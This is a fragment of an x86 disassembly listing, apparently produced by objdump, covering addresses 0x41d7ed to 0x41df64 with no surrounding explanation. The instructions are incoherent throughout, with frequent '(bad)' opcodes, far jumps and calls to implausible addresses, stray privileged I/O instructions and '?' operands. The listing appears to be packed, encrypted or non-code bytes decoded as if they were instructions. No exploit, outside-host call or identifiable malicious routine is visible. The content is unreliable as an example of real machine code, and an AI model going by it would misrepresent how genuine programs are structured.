  41d7ed:	or     esp,ecx
  41d7ef:	bound  edi,QWORD PTR [edi-0x17]
  41d7f2:	retf   
  41d7f3:	(bad)  [ebx+0x2d]
  41d7f6:	pop    edx
  41d7f7:	pop    ebp
  41d7f8:	mov    bl,BYTE PTR [edx+0x39cc05f4]
  41d7fe:	xor    ah,dh
  41d800:	(bad)  
  41d801:	call   0x3d34:0x578ae48c
  41d808:	inc    ebx
  41d809:	cdq    
  41d80a:	js     0x41d87f
  41d80c:	repnz fstp st(1)
  41d80f:	xchg   edx,eax
  41d810:	or     al,0x75
  41d812:	es mov dl,0x7f
  41d815:	lds    ecx,FWORD PTR [eax-0x7a6c1368]
  41d81b:	idiv   BYTE PTR [edi-0x49]
  41d81e:	mov    edx,0xa0ab22e6
  41d823:	sub    BYTE PTR [ebx-0x7b],al
  41d826:	push   edx
  41d827:	cmp    bh,ch
  41d829:	mov    edx,0xdf98d4af
  41d82e:	dec    edx
  41d82f:	mov    ch,ch
  41d831:	xor    ebx,esi
  41d833:	pop    ebp
  41d834:	inc    eax
  41d835:	xchg   ebx,esi
  41d837:	xchg   ebx,eax
  41d838:	xor    al,0x71
  41d83a:	add    ebx,DWORD PTR [edi]
  41d83c:	cmp    DWORD PTR [edi+0x19cc19f5],0x6b
  41d843:	xor    al,0xa4
  41d845:	ins    BYTE PTR es:[edi],dx
  41d846:	and    eax,0x92d708b5
  41d84b:	mov    ah,0xed
  41d84d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d84e:	xor    dh,BYTE PTR [ebx+0x53d4f238]
  41d854:	pop    edi
  41d855:	in     al,dx
  41d856:	mov    eax,0x7b96914b
  41d85b:	sbb    eax,0x776d3c14
  41d860:	xchg   ecx,eax
  41d861:	adc    eax,0xfb1b39e1
  41d866:	(bad)  
  41d867:	in     al,0xab
  41d869:	mov    ah,0x70
  41d86b:	or     DWORD PTR [esi],esp
  41d86d:	dec    edx
  41d86e:	mov    edx,0x95ac7de6
  41d873:	cwde   
  41d874:	lods   al,BYTE PTR ds:[esi]
  41d875:	frstor [eax-0x57]
  41d878:	cmp    bl,0x7a
  41d87b:	sub    DWORD PTR [edi-0x59],ecx
  41d87e:	mov    ebp,0xb79e9c80
  41d883:	shl    BYTE PTR ds:0x59ec23d9,0xa5
  41d88a:	fsub   QWORD PTR [edi-0x45]
  41d88d:	mov    edx,0xd38d54a7
  41d892:	mov    WORD PTR [ecx],es
  41d894:	aam    0xb3
  41d896:	lods   eax,DWORD PTR ds:[esi]
  41d897:	jl     0x41d913
  41d899:	arpl   WORD PTR [esi],cx
  41d89b:	fnstcw WORD PTR [ecx-0x16]
  41d89e:	xchg   esi,eax
  41d89f:	push   cs
  41d8a0:	cdq    
  41d8a1:	mov    bh,0x13
  41d8a3:	addr16 shl cl,cl
  41d8a6:	test   BYTE PTR [ecx],bh
  41d8a8:	or     DWORD PTR [ebp+0x6c],edi
  41d8ab:	test   BYTE PTR [eax],ah
  41d8ad:	sub    DWORD PTR [ebp+0x25a5c177],ebp
  41d8b3:	(bad)  
  41d8b4:	cmp    al,0xfe
  41d8b6:	fsubr  DWORD PTR [ebx]
  41d8b8:	sbb    edx,DWORD PTR [ecx+0x2e]
  41d8bb:	int    0xdb
  41d8bd:	mov    ds:0x9b6210a9,al
  41d8c2:	outs   dx,BYTE PTR ds:[esi]
  41d8c3:	enter  0x24f9,0x55
  41d8c7:	and    BYTE PTR [eax+0x4d],0xe8
  41d8cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8cc:	pop    esi
  41d8cd:	or     al,0xe8
  41d8cf:	jmp    0x41d856
  41d8d1:	ja     0x41d941
  41d8d3:	ficomp DWORD PTR [ebp+eax*2+0x30b9d02e]
  41d8da:	sbb    BYTE PTR [edx-0x6d220119],cl
  41d8e0:	mov    edi,esi
  41d8e2:	dec    esi
  41d8e3:	(bad)  
  41d8e4:	fiadd  WORD PTR [ebp-0xf]
  41d8e7:	cmp    eax,ebx
  41d8e9:	sbb    eax,0xbafac9d4
  41d8ee:	xor    ecx,DWORD PTR [eax+edx*8]
  41d8f1:	adc    DWORD PTR [edi+0x79dbbcd4],0x5
  41d8f8:	add    esp,esi
  41d8fa:	xor    edi,DWORD PTR [ebp-0x29]
  41d8fd:	ds jmp 0xa9101b8e
  41d903:	sbb    dl,BYTE PTR [esi]
  41d905:	inc    edi
  41d906:	mov    BYTE PTR ds:0xb7d2ccc0,bh
  41d90c:	mov    ch,0x91
  41d90e:	add    bl,BYTE PTR [edi+ebp*1+0x20dc48dc]
  41d915:	sub    edx,DWORD PTR [eax+0x6]
  41d918:	(bad)  
  41d919:	js     0x41d969
  41d91b:	jmp    0x5ba85d3e
  41d920:	pop    ecx
  41d921:	and    ebp,edx
  41d923:	xchg   ch,cl
  41d925:	lahf   
  41d926:	inc    ebp
  41d927:	adc    ebx,DWORD PTR [eax+0x57]
  41d92a:	fcmovbe st,st(6)
  41d92c:	scas   eax,DWORD PTR es:[edi]
  41d92d:	outs   dx,DWORD PTR ds:[esi]
  41d92e:	xchg   esp,eax
  41d92f:	inc    esp
  41d930:	imul   eax,DWORD PTR [edx+ebp*8+0x5f],0x3555007b
  41d938:	cs ja  0x41d963
  41d93b:	call   FWORD PTR [edx-0x13]
  41d93e:	push   ss
  41d93f:	or     DWORD PTR [ebp-0x6b],edi
  41d942:	sub    esp,DWORD PTR [edi+esi*8]
  41d945:	xlat   BYTE PTR ds:[bx]
  41d947:	xor    al,BYTE PTR [edx-0x67]
  41d94a:	or     eax,0xb494cff6
  41d94f:	iret   
  41d950:	and    al,0x8d
  41d952:	mov    ?,esp
  41d954:	or     al,0xd4
  41d956:	pop    es
  41d957:	or     edi,0x3d594c2b
  41d95d:	ins    DWORD PTR es:[edi],dx
  41d95e:	sub    ch,bh
  41d960:	mov    ds:0x10cd8147,eax
  41d965:	pop    ds
  41d966:	or     al,0xe4
  41d968:	add    BYTE PTR [ebx+0x6e0f145d],0xd0
  41d96f:	jb     0x41d92d
  41d971:	xchg   edi,eax
  41d972:	inc    ebx
  41d973:	mov    al,0x6a
  41d975:	sub    BYTE PTR [ecx],dh
  41d977:	jp     0x41d93b
  41d979:	push   ds
  41d97a:	test   eax,0x8c9cc073
  41d97f:	in     eax,0x38
  41d981:	or     eax,0xb62b524b
  41d986:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d987:	rcr    eax,cl
  41d989:	push   esp
  41d98a:	push   ebp
  41d98b:	push   esi
  41d98c:	mov    esi,0xdc8ffc8f
  41d991:	sar    cl,1
  41d993:	adc    esi,ecx
  41d995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d996:	outs   dx,BYTE PTR ds:[esi]
  41d997:	xchg   ecx,eax
  41d998:	das    
  41d999:	popf   
  41d99a:	imul   esp,DWORD PTR [eax],0x55b11050
  41d9a0:	(bad)  
  41d9a2:	nop
  41d9a3:	ret    0xb45c
  41d9a6:	adc    al,BYTE PTR [edx-0x67]
  41d9a9:	mov    ch,0xdc
  41d9ab:	jo     0x41d9e4
  41d9ad:	cmp    bl,BYTE PTR [esi-0x5a]
  41d9b0:	mov    dh,0xf6
  41d9b2:	lods   eax,DWORD PTR ds:[esi]
  41d9b3:	xchg   DWORD PTR [ecx+0x4c],eax
  41d9b6:	mov    edx,0xcb863284
  41d9bb:	jmp    0xe1630bae
  41d9c0:	jb     0x41d994
  41d9c2:	inc    esp
  41d9c3:	scas   eax,DWORD PTR es:[edi]
  41d9c4:	shl    DWORD PTR [esi],0x55
  41d9c7:	in     eax,dx
  41d9c8:	fwait
  41d9c9:	sahf   
  41d9ca:	test   ch,dh
  41d9cc:	fwait
  41d9cd:	call   0xf54b6511
  41d9d2:	fs pop eax
  41d9d4:	fwait
  41d9d5:	mov    edx,0xba2dded
  41d9da:	repnz out dx,eax
  41d9dc:	mov    es,WORD PTR [ecx-0x51036e4b]
  41d9e2:	push   esi
  41d9e3:	ds stos BYTE PTR es:[edi],al
  41d9e5:	jle    0x41da3e
  41d9e7:	mov    ebx,0x7822298f
  41d9ec:	mov    ch,0x9e
  41d9ee:	ret    
  41d9ef:	mov    eax,ds:0xa53dd6c8
  41d9f4:	ss jge 0x41d9d9
  41d9f7:	push   edi
  41d9f8:	or     eax,0x76766ad1
  41d9fd:	sbb    BYTE PTR [edx-0x55],0x2a
  41da01:	xor    DWORD PTR [ebx-0x4c],ebx
  41da04:	dec    esi
  41da05:	inc    esp
  41da06:	jb     0x41d9cf
  41da08:	jg     0x41d98b
  41da0a:	in     eax,0xd
  41da0c:	outs   dx,DWORD PTR ds:[esi]
  41da0d:	ds iret 
  41da0f:	or     BYTE PTR [edx-0x1b3e3322],0x46
  41da16:	iret   
  41da17:	pmuludq mm4,QWORD PTR [eax+ebp*4]
  41da1b:	dec    esi
  41da1c:	data16 clc 
  41da1e:	pause  
  41da20:	pusha  
  41da21:	sbb    al,0x20
  41da23:	push   edi
  41da24:	xchg   ebp,eax
  41da25:	xor    BYTE PTR [ebp-0x4f20b2ce],0xe3
  41da2c:	pushf  
  41da2d:	ja     0x41da4a
  41da2f:	add    ebp,DWORD PTR [edx-0x49]
  41da32:	aaa    
  41da33:	inc    edx
  41da34:	dec    ebp
  41da35:	dec    ecx
  41da36:	push   ebp
  41da37:	(bad)  
  41da38:	in     eax,dx
  41da39:	(bad)  
  41da3a:	(bad)  
  41da3b:	sti    
  41da3c:	jecxz  0x41d9d9
  41da3e:	inc    esp
  41da3f:	xor    BYTE PTR [esp+ebx*8+0x69],dh
  41da43:	nop
  41da44:	ret    
  41da45:	xchg   esp,eax
  41da46:	sahf   
  41da47:	fnsave [ebp+eiz*1-0xd]
  41da4b:	inc    edx
  41da4c:	(bad)  
  41da4d:	loop   0x41da41
  41da4f:	gs jnp 0x41da86
  41da52:	mov    cl,0xe7
  41da54:	repz enter 0xbe63,0x6c
  41da59:	nop
  41da5a:	js     0x41da80
  41da5c:	mov    WORD PTR ds:0x903b2f4e,cs
  41da62:	mov    bh,0xc
  41da64:	inc    esi
  41da65:	leave  
  41da66:	retf   
  41da67:	cdq    
  41da68:	and    bl,BYTE PTR [ebp+0x7]
  41da6b:	nop
  41da6c:	pop    ss
  41da6d:	test   BYTE PTR [edx+0x142efc53],cl
  41da73:	sbb    ebx,DWORD PTR ds:0xf6994b67
  41da79:	jno    0x41da83
  41da7b:	sbb    eax,0x2f3a1c0e
  41da80:	xchg   ebp,eax
  41da81:	gs pop ds
  41da83:	or     BYTE PTR [edx-0x3797f4bb],bh
  41da89:	pop    ecx
  41da8a:	xchg   ecx,eax
  41da8b:	lods   al,BYTE PTR ds:[esi]
  41da8c:	out    dx,al
  41da8d:	sbb    dh,al
  41da8f:	nop
  41da90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da91:	sub    DWORD PTR [esi-0x3dc38257],ebx
  41da97:	lods   al,BYTE PTR ds:[esi]
  41da98:	shl    DWORD PTR [eax-0x4d5c3f02],0x16
  41da9f:	mov    eax,0x71acff89
  41daa4:	dec    ebp
  41daa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daa6:	pusha  
  41daa7:	mov    ebx,0x3cf75bba
  41daac:	jg     0x41da5c
  41daae:	popf   
  41daaf:	sbb    al,0x26
  41dab1:	outs   dx,DWORD PTR ds:[esi]
  41dab2:	push   edx
  41dab3:	pop    ds
  41dab4:	daa    
  41dab5:	inc    esp
  41dab6:	mov    ah,0x89
  41dab8:	xor    DWORD PTR ds:0xf309e838,edx
  41dabe:	push   0x622d355f
  41dac3:	xchg   ebp,eax
  41dac4:	pusha  
  41dac5:	dec    eax
  41dac6:	and    BYTE PTR [edx+0x256b1739],ch
  41dacc:	stc    
  41dacd:	sbb    DWORD PTR ds:0x70cd213,esp
  41dad3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dad4:	inc    ebx
  41dad5:	add    al,0xa7
  41dad7:	loopne 0x41dabb
  41dad9:	addr16 mov esp,0xdb364b0f
  41dadf:	sub    dh,BYTE PTR [esi]
  41dae1:	or     eax,0x187264c4
  41dae6:	int3   
  41dae7:	xor    dh,BYTE PTR [edi]
  41dae9:	inc    ecx
  41daea:	or     BYTE PTR [ebx+0x5f68eb85],0x6
  41daf1:	cmp    eax,0xcf8a34eb
  41daf6:	mov    ch,0xaa
  41daf8:	fcom   DWORD PTR [ebp-0x2953c5b9]
  41dafe:	dec    eax
  41daff:	dec    esp
  41db00:	push   ss
  41db01:	add    dh,BYTE PTR [eax+0x1c]
  41db04:	mov    ds:0x1c2d3b94,ax
  41db0a:	jno    0x41db32
  41db0c:	xchg   esp,eax
  41db0d:	xchg   BYTE PTR [esi+ebp*4],al
  41db10:	xor    edi,ebx
  41db12:	ins    BYTE PTR es:[edi],dx
  41db13:	mov    gs,WORD PTR [ecx]
  41db15:	push   esi
  41db16:	bound  ebx,QWORD PTR [ebp-0x6c]
  41db19:	mov    ds,WORD PTR [edx+0x61]
  41db1c:	std    
  41db1d:	hlt    
  41db1e:	jmp    0xf6bbe4b7
  41db23:	xlat   BYTE PTR ds:[ebx]
  41db24:	in     al,0x90
  41db26:	sar    DWORD PTR [esi],1
  41db28:	mov    ah,0xc
  41db2a:	loope  0x41db15
  41db2c:	mov    gs,eax
  41db2e:	popa   
  41db2f:	shl    DWORD PTR [esi],cl
  41db31:	int    0x5c
  41db33:	popf   
  41db34:	sub    cl,al
  41db36:	adc    bl,BYTE PTR [ecx-0x78af0959]
  41db3c:	xor    BYTE PTR [ebx-0x74],0x6e
  41db40:	in     al,dx
  41db41:	std    
  41db42:	pop    esp
  41db43:	imul   edi,DWORD PTR [edi+ebp*8],0xaeedee73
  41db4a:	push   edi
  41db4b:	dec    esp
  41db4c:	mov    dh,0x31
  41db4e:	xchg   esp,eax
  41db4f:	ins    DWORD PTR es:[edi],dx
  41db50:	sti    
  41db51:	cmp    esi,esi
  41db53:	jmp    0xf036:0xb45829c5
  41db5a:	loopne 0x41dadd
  41db5c:	sbb    eax,DWORD PTR [esi+0x2f8c9021]
  41db62:	push   es
  41db63:	loope  0x41db24
  41db65:	loope  0x41db21
  41db67:	and    eax,0x4dfa792a
  41db6c:	add    edi,esi
  41db6e:	sbb    dl,BYTE PTR [edx]
  41db70:	xchg   edi,eax
  41db71:	dec    DWORD PTR [edi+0x51c3a93f]
  41db77:	fadd   QWORD PTR [esi]
  41db79:	dec    edx
  41db7a:	in     al,0x3e
  41db7c:	test   eax,0x1285e3e1
  41db81:	ret    
  41db82:	(bad)  
  41db83:	test   DWORD PTR [edi+0x1a],esp
  41db86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db87:	mov    dh,0x6b
  41db89:	aad    0x4d
  41db8b:	push   ebx
  41db8c:	jg     0x41dc08
  41db8e:	xchg   ebp,eax
  41db8f:	cs or  edi,esp
  41db92:	das    
  41db93:	dec    BYTE PTR [eax+0x628a93d3]
  41db99:	out    0xe,al
  41db9b:	dec    esp
  41db9c:	and    al,BYTE PTR [esi]
  41db9e:	push   ebp
  41db9f:	and    al,0x45
  41dba1:	add    al,BYTE PTR [esi+0x32c06ebf]
  41dba7:	mov    ds,ebp
  41dba9:	push   esi
  41dbaa:	lods   al,BYTE PTR ds:[esi]
  41dbab:	lock jae 0x41db55
  41dbae:	add    DWORD PTR [ebx+0x49],ebp
  41dbb1:	ja     0x41db37
  41dbb3:	xchg   esi,eax
  41dbb4:	push   es
  41dbb5:	out    dx,al
  41dbb6:	or     bl,ah
  41dbb8:	cmc    
  41dbb9:	arpl   WORD PTR [ecx+0x5e5bc779],bx
  41dbbf:	(bad)
  41dbc2:	sub    DWORD PTR [esi+0x726e3215],0x22e81cda
  41dbcc:	stos   DWORD PTR es:[edi],eax
  41dbcd:	xor    al,0x4c
  41dbcf:	adc    esi,edx
  41dbd1:	mov    bl,0x2c
  41dbd3:	imul   edx,DWORD PTR [edi-0x3a],0xab8c932a
  41dbda:	sbb    esi,DWORD PTR [esi+0x1ca92636]
  41dbe0:	mov    WORD PTR [ebx+ecx*1-0x3ca029eb],?
  41dbe7:	pop    ds
  41dbe8:	add    esp,esi
  41dbea:	inc    ebx
  41dbeb:	ins    BYTE PTR es:[edi],dx
  41dbec:	add    al,0x6
  41dbee:	ror    BYTE PTR [esi+ecx*8+0x76d56b4b],0xe3
  41dbf6:	mov    edx,0xfdb09d09
  41dbfb:	cs xchg esi,eax
  41dbfd:	xor    eax,0xea3a51c7
  41dc02:	mov    al,0x76
  41dc04:	into   
  41dc05:	inc    esp
  41dc06:	enter  0x77c6,0x73
  41dc0a:	dec    eax
  41dc0b:	xor    eax,0xa2e73cbf
  41dc10:	ror    DWORD PTR [edx+edx*8-0xc],1
  41dc14:	ja     0x41dbc4
  41dc16:	aaa    
  41dc17:	imul   ebx,esi,0x735fd895
  41dc1d:	pop    ecx
  41dc1e:	jmp    0xcce51767
  41dc23:	adc    eax,0xf4b0b460
  41dc28:	jno    0x41dc09
  41dc2a:	dec    esp
  41dc2b:	(bad)  
  41dc2c:	mov    edx,0x4ac6f674
  41dc31:	or     DWORD PTR ds:0xdddc22f8,edi
  41dc37:	mov    esi,0xdfe2d96c
  41dc3c:	stc    
  41dc3d:	in     al,0x35
  41dc3f:	add    ebp,esi
  41dc41:	or     edi,0x7598ed02
  41dc47:	inc    eax
  41dc48:	mov    ch,0x34
  41dc4a:	inc    esi
  41dc4b:	out    0x40,al
  41dc4d:	mov    eax,ds:0x744d5d90
  41dc52:	jo     0x41dcab
  41dc54:	sub    al,ch
  41dc56:	jo     0x41dc65
  41dc58:	ret    0xff76
  41dc5b:	test   bh,dl
  41dc5d:	pop    DWORD PTR fs:[ecx-0x4d]
  41dc61:	retf   0xa4a9
  41dc64:	xor    al,0x3f
  41dc66:	push   edx
  41dc67:	mov    ch,0xbe
  41dc69:	push   eax
  41dc6a:	fisubr DWORD PTR [esi*1+0x2c2c9a87]
  41dc71:	stc    
  41dc72:	cmp    DWORD PTR ds:0x29107dd5,edi
  41dc78:	and    esp,DWORD PTR cs:[ecx-0x1f786a2e]
  41dc7f:	adc    bl,dh
  41dc81:	push   edx
  41dc82:	ins    DWORD PTR es:[edi],dx
  41dc83:	xor    BYTE PTR [ecx],dl
  41dc85:	(bad)  
  41dc87:	push   ds
  41dc88:	daa    
  41dc89:	jo     0x41dc52
  41dc8b:	pop    ds
  41dc8c:	or     ch,BYTE PTR [edi]
  41dc8e:	and    ah,al
  41dc90:	jo     0x41dc67
  41dc92:	jns    0x41dca0
  41dc94:	cmp    cl,BYTE PTR [eax]
  41dc96:	das    
  41dc97:	mov    DWORD PTR [esi],ebp
  41dc99:	(bad)  
  41dc9a:	pop    edi
  41dc9b:	bound  ecx,QWORD PTR [ecx]
  41dc9d:	adc    al,0x2a
  41dc9f:	bound  edx,QWORD PTR [ebx+esi*4]
  41dca2:	cmc    
  41dca3:	xor    al,0x66
  41dca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dca6:	xchg   ecx,eax
  41dca7:	outs   dx,BYTE PTR ds:[esi]
  41dca8:	inc    ebp
  41dca9:	inc    eax
  41dcaa:	mov    bl,0x91
  41dcac:	mov    esi,0x9f1c0f6d
  41dcb1:	inc    ecx
  41dcb2:	ficom  WORD PTR [esi]
  41dcb4:	push   edi
  41dcb5:	push   eax
  41dcb6:	lock movlps QWORD PTR [ecx],xmm1
  41dcba:	(bad)  
  41dcbc:	jg     0x41dc87
  41dcbe:	mov    ecx,0x3f6d3387
  41dcc3:	sar    BYTE PTR [eax-0x36b11e93],cl
  41dcc9:	test   eax,0xd4e261c5
  41dcce:	test   BYTE PTR [edx],bl
  41dcd0:	cwde   
  41dcd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcd2:	icebp  
  41dcd3:	hlt    
  41dcd4:	ficom  DWORD PTR [esi+0x19]
  41dcd7:	out    0xa3,eax
  41dcd9:	cmp    DWORD PTR [esi-0x3555e63],ecx
  41dcdf:	cmp    al,0xfc
  41dce1:	pop    edx
  41dce2:	and    edi,esp
  41dce4:	sbb    DWORD PTR [ebx+0x47],edi
  41dce7:	scas   al,BYTE PTR es:[edi]
  41dce8:	dec    ecx
  41dce9:	cmp    ah,0xff
  41dcec:	imul   ebx,eax,0x1eaf52f5
  41dcf2:	int3   
  41dcf3:	out    0x55,eax
  41dcf5:	jmp    0x71be:0xd3a9be7f
  41dcfc:	push   ebx
  41dcfd:	sub    ecx,ebp
  41dcff:	push   eax
  41dd00:	xor    al,0x2f
  41dd02:	xchg   ebx,eax
  41dd03:	jb     0x41dd0a
  41dd05:	call   0xd54d:0x3cb3362
  41dd0c:	aam    0x27
  41dd0e:	jne    0x41dd4d
  41dd10:	push   eax
  41dd11:	aas    
  41dd12:	push   ecx
  41dd13:	clc    
  41dd14:	fs pop edi
  41dd16:	cmp    eax,0xfa6e7411
  41dd1b:	inc    ecx
  41dd1c:	cmp    BYTE PTR [esi-0x5afe061a],al
  41dd22:	(bad)  
  41dd23:	sbb    al,0x2f
  41dd25:	dec    esi
  41dd26:	push   0x9a4018bb
  41dd2b:	sub    eax,0x335519c5
  41dd30:	ret    0x4a8f
  41dd33:	mov    DWORD PTR [esi-0x3c1573d9],esp
  41dd39:	cmpps  xmm7,XMMWORD PTR [ebp+0x28],0x55
  41dd3e:	or     eax,0xae937b23
  41dd43:	enter  0x82c0,0x54
  41dd47:	jge    0x41dcde
  41dd49:	mov    ah,0xf6
  41dd4b:	dec    ecx
  41dd4c:	fistp  QWORD PTR [edx-0x29]
  41dd4f:	enter  0x82f8,0xd8
  41dd53:	mov    eax,0xfd43c1b1
  41dd58:	(bad)  
  41dd59:	gs arpl sp,bx
  41dd5c:	outs   dx,DWORD PTR ds:[esi]
  41dd5d:	dec    edi
  41dd5e:	leave  
  41dd5f:	bound  ebx,QWORD PTR [esi]
  41dd61:	cmp    eax,0x23451a4d
  41dd66:	pop    eax
  41dd67:	dec    ecx
  41dd68:	int3   
  41dd69:	sub    bl,bl
  41dd6b:	bound  edi,QWORD PTR [eax]
  41dd6d:	push   es
  41dd6e:	sub    eax,0x27c27007
  41dd73:	icebp  
  41dd74:	jmp    0xeaf73548
  41dd79:	out    dx,al
  41dd7a:	cmp    eax,0x33e638a4
  41dd7f:	xchg   edi,eax
  41dd80:	pop    eax
  41dd81:	xor    eax,0xce0453df
  41dd86:	sbb    DWORD PTR [ebx+0x3a],ebp
  41dd89:	(bad)  [esi]
  41dd8b:	imul   ebp,ebp,0x8e2424e8
  41dd91:	and    cl,BYTE PTR [esi+0xf]
  41dd94:	mov    esp,DWORD PTR fs:[edi-0x1cdfb3c9]
  41dd9b:	or     eax,0xffffff91
  41dd9e:	mov    bh,0xe7
  41dda0:	fs test eax,0xf63e0438
  41dda6:	leave  
  41dda7:	sub    ah,bl
  41dda9:	mov    al,ds:0xad9e8ca1
  41ddae:	push   ds
  41ddaf:	int3   
  41ddb0:	xchg   edx,eax
  41ddb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddb2:	mov    esi,0x17be7113
  41ddb7:	fmul   QWORD PTR [eax+0x5d]
  41ddba:	mov    ?,WORD PTR [esi-0x10df57d6]
  41ddc0:	and    ebp,esp
  41ddc2:	les    ecx,FWORD PTR [eax*8-0x72e1ffea]
  41ddc9:	inc    ebp
  41ddca:	adc    al,0x60
  41ddcc:	push   cs
  41ddcd:	xlat   BYTE PTR ds:[ebx]
  41ddce:	dec    bl
  41ddd0:	out    dx,eax
  41ddd1:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41ddd3:	cmp    DWORD PTR [edi-0x936f29d],esp
  41ddd9:	jg     0x41de3b
  41dddb:	mov    bh,0xc3
  41dddd:	cmp    DWORD PTR [eax+0x8df06bb],esp
  41dde3:	pop    esi
  41dde4:	lahf   
  41dde5:	sbb    BYTE PTR [ebp+0x67],bl
  41dde8:	xchg   edi,eax
  41dde9:	shr    BYTE PTR [ebx+ecx*8],cl
  41ddec:	rcl    DWORD PTR [esi+0x24],1
  41ddef:	and    ebp,0x25d7a9ba
  41ddf5:	paddq  mm2,QWORD PTR [esi-0x231637a7]
  41ddfc:	add    DWORD PTR [edi],esi
  41ddfe:	xchg   bh,ch
  41de00:	mov    dl,0x95
  41de02:	iret   
  41de03:	out    dx,eax
  41de04:	fsub   DWORD PTR [edx+ebx*1+0x1a10a9c0]
  41de0b:	mov    esi,DWORD PTR [eax+0x1a91c099]
  41de11:	sub    DWORD PTR [ebx],ecx
  41de13:	sub    ah,BYTE PTR [ecx-0x5a4f3ea1]
  41de19:	mov    al,0x94
  41de1b:	fild   WORD PTR [esi+0x1e0a5551]
  41de21:	and    bl,BYTE PTR [ecx+ecx*1]
  41de24:	mov    eax,0x17c13474
  41de29:	mov    dl,0x9b
  41de2b:	retf   0x442b
  41de2e:	mov    BYTE PTR [esi-0x4f],bl
  41de31:	cmp    BYTE PTR [ebx-0x71f1c97],cl
  41de37:	xor    esi,esi
  41de39:	inc    ebx
  41de3a:	mov    ah,0x47
  41de3c:	push   ecx
  41de3d:	cmp    al,0x89
  41de3f:	ins    BYTE PTR es:[edi],dx
  41de40:	pop    edi
  41de41:	clc    
  41de42:	fisttp WORD PTR [eax+0x54]
  41de45:	ret    
  41de46:	arpl   WORD PTR [ebp+0x75],sp
  41de49:	out    0x50,eax
  41de4b:	ror    BYTE PTR [edx+0x58],cl
  41de4e:	pop    eax
  41de4f:	loop   0x41de55
  41de51:	(bad)  
  41de52:	es mov eax,0xdc9ec528
  41de58:	cmc    
  41de59:	(bad)  
  41de5a:	test   DWORD PTR [ecx],0x549d348d
  41de60:	push   ds
  41de61:	out    0xa8,eax
  41de63:	cdq    
  41de64:	dec    ecx
  41de65:	and    dl,dl
  41de67:	sub    al,0x88
  41de69:	test   BYTE PTR [edi+0x79077cd6],dl
  41de6f:	sub    ch,cl
  41de71:	ds cmp edx,esp
  41de74:	gs jns 0x41de14
  41de77:	inc    ecx
  41de78:	cld    
  41de79:	add    edx,DWORD PTR [ecx+0x65]
  41de7c:	adc    DWORD PTR [edx],esp
  41de7e:	jmp    0x41ded5
  41de80:	out    dx,eax
  41de81:	sbb    ch,bh
  41de83:	pop    es
  41de84:	sbb    dh,dh
  41de86:	sbb    al,0x57
  41de88:	xor    DWORD PTR [bp+si+0xb1c],ebp
  41de8d:	xchg   edx,eax
  41de8e:	aam    0x8b
  41de90:	stc    
  41de91:	pop    ecx
  41de92:	sub    eax,0xf2b12423
  41de97:	loope  0x41de6d
  41de99:	loopne 0x41de5d
  41de9b:	add    al,0x5e
  41de9d:	sbb    al,0x48
  41de9f:	fimul  DWORD PTR [eax]
  41dea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dea2:	mov    DWORD PTR [esi+0x10470aa8],edx
  41dea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dea9:	dec    esp
  41deaa:	jb     0x41deb4
  41deac:	push   ss
  41dead:	add    BYTE PTR [ebp+0x5e38d2ac],0xf9
  41deb4:	in     al,0xe
  41deb6:	adc    ebp,esp
  41deb8:	scas   al,BYTE PTR es:[edi]
  41deb9:	int3   
  41deba:	mov    WORD PTR [ebx-0x5f],fs
  41debd:	jl     0x41de44
  41debf:	lea    esp,[ebx+0x48]
  41dec2:	jne    0x41df29
  41dec4:	repz aad 0x92
  41dec7:	test   eax,0x203ea056
  41decc:	or     eax,0x4a8b5e6d
  41ded1:	inc    ebx
  41ded2:	xor    dl,BYTE PTR [edi+0x16d246a4]
  41ded8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ded9:	mov    ds:0x1478dcd0,eax
  41dede:	push   ds
  41dedf:	jecxz  0x41deb2
  41dee1:	in     al,dx
  41dee2:	adc    BYTE PTR [esi],bh
  41dee4:	push   edx
  41dee5:	push   esp
  41dee6:	sar    BYTE PTR [ebx],0x92
  41dee9:	ins    BYTE PTR es:[edi],dx
  41deea:	mov    eax,DWORD PTR ds:0xf71518f9
  41def0:	out    dx,eax
  41def1:	dec    esp
  41def2:	stos   BYTE PTR es:[edi],al
  41def3:	in     eax,0x58
  41def5:	bsf    eax,DWORD PTR ds:0x2d8eb266
  41defc:	cmp    eax,0xa281a82b
  41df01:	cmp    eax,0xa1ef348c
  41df06:	lds    ebp,FWORD PTR [ebx+0x3adf1bae]
  41df0c:	aad    0xc8
  41df0e:	(bad)  
  41df0f:	ret    0x7279
  41df12:	fidiv  WORD PTR [esi]
  41df14:	inc    edx
  41df15:	scas   eax,DWORD PTR es:[edi]
  41df16:	push   edi
  41df17:	outs   dx,BYTE PTR ds:[esi]
  41df18:	in     al,0x2e
  41df1a:	xor    DWORD PTR [ebp-0x782e0bc4],esp
  41df20:	lock call 0xddeaadfc
  41df26:	into   
  41df27:	dec    edx
  41df28:	dec    esp
  41df29:	or     cl,BYTE PTR [ebx-0x75785a51]
  41df2f:	dec    esi
  41df30:	dec    ebp
  41df31:	shr    BYTE PTR ds:0xc6fbc6ef,0x82
  41df38:	or     BYTE PTR [ebx-0x404dd56],bh
  41df3e:	in     eax,0x64
  41df40:	gs cwde 
  41df42:	aas    
  41df43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df44:	inc    ecx
  41df45:	adc    BYTE PTR [edi*4-0x53baabc2],0x14
  41df4d:	xlat   BYTE PTR ds:[ebx]
  41df4e:	xchg   esp,eax
  41df4f:	cmc    
  41df50:	call   0x5c2946ea
  41df55:	jae    0x41df43
  41df57:	cmp    eax,0x8bd97cbd
  41df5c:	sbb    BYTE PTR [edx-0x1a],ch
  41df5f:	cmp    DWORD PTR [ebp-0x3a],eax
  41df62:	fadd   st,st(4)
  41df64:	aad    0x6a
